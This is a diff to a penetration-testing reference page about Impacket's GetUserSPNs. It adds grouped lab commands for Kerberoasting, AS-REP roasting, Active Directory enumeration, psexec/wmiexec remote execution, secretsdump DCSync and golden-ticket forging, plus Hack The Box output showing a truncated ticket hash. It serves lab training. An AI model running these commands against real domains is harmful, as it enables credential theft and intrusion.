@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=getuserspns) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -22,8 +24,172 @@ impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile ti
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=GetUserSPNs)
+## Notebook recipes
 
-## Learning and original examples
+9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Kerberoasting: Quick Reference](/active-directory/kerberoasting)
+<AccordionGroup>
+
+<Accordion title="Kerberos / Spns">
+
+### Kerberos / Spns
+
+**Active Directory Enumeration Commands**
+
+```bash
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+    # Find user accounts with registered SPNs
+
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
+    # Request TGS tickets for Kerberoasting
+
+GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass
+    # Find accounts vulnerable to AS-REP roasting
+
+GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+    # Query for AS-REP roastable accounts using credentials
+```
+
+</Accordion>
+
+<Accordion title="Quick Htb Workflow">
+
+### Quick Htb Workflow
+
+**Active Directory Enumeration Commands**
+
+```bash
+# 1. Verify credentials
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 2. Enumerate shares
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+
+# 3. Check user information / groups
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 4. Enumerate domain groups
+net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 5. Check LDAP
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 6. Look for Kerberoastable accounts
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+
+# 7. Check WinRM access
+nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 8. If WinRM works, connect
+evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
+```
+
+</Accordion>
+
+<Accordion title="Using GetUserSPNs.py">
+
+### Using GetUserSPNs.py
+
+**Cross-Forest Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
+```
+
+</Accordion>
+
+<Accordion title="Using the -request Flag">
+
+### Using the -request Flag
+
+**Cross-Forest Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>
+
+
+$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
+```
+
+</Accordion>
+
+<Accordion title="Original captured examples">
+
+### Original captured examples
+
+**Impacket: Script Quick Reference**
+
+```bash
+# remote execution (need admin creds or hash)
+psexec.py $DOMAIN/admin:PASS@$IP            # SYSTEM shell (noisy)
+wmiexec.py $DOMAIN/admin@$IP -hashes :<nt>  # semi-interactive, quieter
+smbexec.py / atexec.py / dcomexec.py        # alternatives
+# credentials
+secretsdump.py $DOMAIN/USER:PASS@$DC -just-dc   # DCSync
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request     # Kerberoast
+GetNPUsers.py  $DOMAIN/ -usersfile users.txt -no-pass    # AS-REP roast
+# tickets
+getTGT.py $DOMAIN/USER:PASS ; export KRB5CCNAME=USER.ccache
+ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   # golden
+# shares / lookups
+smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
+```
+
+</Accordion>
+
+<Accordion title="Practical Application">
+
+### Practical Application
+
+**Kerberoasting from Linux**
+
+```shell
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
+```
+
+**Kerberoasting from Linux**
+
+```shell
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile tickets.txt
+```
+
+**Kerberoasting from Linux**
+
+Context from the notebook: The attack is performed from a Linux host using Impacket's  GetUserSPNs.py  script. The main prerequisite is a set of valid domain credentials (username/password or NTLM hash).
+
+```text
+GetUserSPNs.py
+```
+
+</Accordion>
+
+<Accordion title="Kerberoasting: Quick Reference">
+
+### Kerberoasting: Quick Reference
+
+**Kerberoasting: Quick Reference**
+
+```bash
+# Linux (Impacket) — needs any valid domain creds
+GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request -outputfile kerb.hash
+# NetExec
+nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
+```
+
+</Accordion>
+
+</AccordionGroup>
